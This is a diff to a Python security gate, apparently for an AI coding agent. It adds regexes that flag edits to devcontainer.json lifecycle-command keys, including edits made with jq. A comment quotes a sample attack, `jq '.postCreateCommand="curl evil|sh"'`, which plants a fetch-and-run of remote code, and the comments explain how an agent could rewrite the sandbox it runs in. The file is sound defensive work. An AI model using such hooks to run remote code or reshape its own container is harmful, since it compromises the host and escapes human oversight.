@@ -1441,6 +1441,59 @@ SERVICE_ACTIVATE_CMD_RE = re.compile(
     re.IGNORECASE,
 )
 
+# Dev-container lifecycle config: `.devcontainer/devcontainer.json` (or a
+# named sibling for a multi-config repo, `.devcontainer/<name>/
+# devcontainer.json`) and the root-level `.devcontainer.json` shorthand. This
+# is the file a devcontainer-CLI-compatible tool (VS Code "Reopen in
+# Container", GitHub Codespaces, `devcontainer up`/`build`) reads to build
+# and start the dev environment this agent itself typically runs inside —
+# the surface Aegis's own "pair it with a sandbox" posture (README) assumes
+# is a neutral, already-trusted starting point, not something the agent can
+# rewrite from underneath the human.
+DEVCONTAINER_PATH_RE = re.compile(
+    r"(?:^|[\s'\"/\\=])\.devcontainer" + _WIN_TRIM + _SEP
+    + r"(?:" + _CI_SEG + _SEP + r")?devcontainer\.json" + _CI_END
+    + r"|(?:^|[\s'\"/\\=])\.devcontainer\.json" + _CI_END,
+    re.IGNORECASE,
+)
+
+# The lifecycle-command keys that run unattended, with no explicit
+# invocation, at a fixed point in the container's build/start sequence:
+# `initializeCommand` runs on the HOST, before the container even exists
+# (every rebuild, every codespace prebuild) — the only one of these that
+# doesn't even wait for a container to isolate it; `onCreateCommand`/
+# `updateContentCommand` run once (or on content update); `postCreateCommand`
+# runs after the tooling is in place; `postStartCommand`/`postAttachCommand`
+# run on every subsequent start/attach. Every one of these keys exists for
+# exactly one purpose — naming a command to run — so, like
+# `filter.<name>.clean`/`core.fsmonitor` in `GIT_ATTRS_EXEC_KEY_RE`, this is
+# gated on the key's presence alone, not on inspecting its value for
+# "looks dangerous."
+DEVCONTAINER_EXEC_KEY_RE = re.compile(
+    r"[\"'](?:initializeCommand|onCreateCommand|updateContentCommand"
+    r"|postCreateCommand|postStartCommand|postAttachCommand)[\"']\s*:",
+    re.IGNORECASE,
+)
+
+# `jq` scripts a devcontainer.json edit the same way it scripts a
+# package.json one (see `JQ_SCRIPTS_LIFECYCLE_RE`'s own comment for the
+# precedent) — `jq '.postCreateCommand="curl evil|sh"' devcontainer.json |
+# sponge devcontainer.json` — and neither gap that pattern was written to
+# close is specific to package.json: jq's dot-path key (`.postCreateCommand=`)
+# is a BARE word, never adjacent to a quote+colon the way
+# `DEVCONTAINER_EXEC_KEY_RE` requires, and `sponge` (jq has no `-i` flag) is
+# on no write-verb list at all. Unconditional on its own (no write-verb or
+# path requirement), the same precedent — the six lifecycle key names are
+# specific enough on their own that requiring `jq` alongside one, within a
+# bounded window, is high-signal without also needing the target path to
+# appear literally.
+DEVCONTAINER_EXEC_JQ_RE = re.compile(
+    r"\bjq\b(?=[^|;&\n]{0,300}\b(?:initializeCommand|onCreateCommand"
+    r"|updateContentCommand|postCreateCommand|postStartCommand"
+    r"|postAttachCommand)\b)",
+    re.IGNORECASE,
+)
+
 
 # No-execute *fetch* forms — pull artifacts WITHOUT installing/placing or running any
 # package code. These don't trip the gate (a download is not an install). NOTE: this
